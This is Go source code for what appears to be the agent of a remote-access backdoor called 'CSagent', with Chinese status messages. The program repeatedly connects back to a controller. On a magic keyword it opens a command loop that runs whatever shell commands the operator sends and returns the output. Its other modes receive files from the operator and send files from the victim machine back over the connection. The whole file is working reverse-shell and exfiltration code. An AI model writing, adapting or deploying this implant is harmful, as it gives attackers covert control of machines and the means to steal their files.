package main

import (
	"CSagent/function"
	"CSagent/upload"
	"fmt"
	"time"
)

var ip string
var port string

func main() {
connALL2:
	// time.Sleep(time.Second)
	for {
		conn := function.Conn_net()
		if conn == nil {
			continue
		}
	connALL:
		code, _ := function.Read_conn(conn)
		fmt.Println(code)
		if code == "Xioaruanshell" {
			for {
				pwd := function.GetPwd()
				function.Write_conn(conn, pwd)
				fmt.Println("路径写入成功")
				shell, err := function.Read_conn(conn)
				if shell == "no" {
					fmt.Println("取消链接")
					goto connALL
				}
				if err != nil {
					fmt.Println("读取错误:", err)
					break
				}
				output := function.ExecCode(shell)
				function.Write_conn(conn, output)
				out, err := function.Read_conn(conn)
				if out == "ok" {
					continue
				} else {
					break
				}
			}
		} else {
			for {

				choose, _ := function.Read_conn(conn) //处理选择
				// fmt.Println(choose)
				switch choose {
				case "1":
					time.Sleep(time.Microsecond * 200)
					file, err := function.Read_conn(conn)
					if file == "no" {
						fmt.Println("取消链接")
						goto connALL
					}
					if err != nil {
						fmt.Println("读取错误:", err)
						goto connALL2
					}
					/*获取成功*/
					upload.CreateFile(conn, file)
				case "2":
					pwdshell := "dir"
					output := function.ExecCode(pwdshell)
					function.Write_conn(conn, output)
					time.Sleep(time.Microsecond * 200)
					file, err := function.Read_conn(conn)
					if file == "no" {
						fmt.Println("取消链接")
						goto connALL
					}
					if err != nil {
						fmt.Println("读取错误:", err)
						goto connALL2
					}
					/*获取成功*/
					code := upload.CheckFile(file)
					if code == "no" {
						fmt.Println("文件不存在")
						continue
					}
					filebase := upload.CheckFileName(file)
					fmt.Println(filebase)
					// fmt.Println("发送文件名成功")
					// function.Write_conn(conn, filebase)
					time.Sleep(time.Microsecond * 200)
					upload.Doupload(file, conn)
				}
			}
		}
	}
}


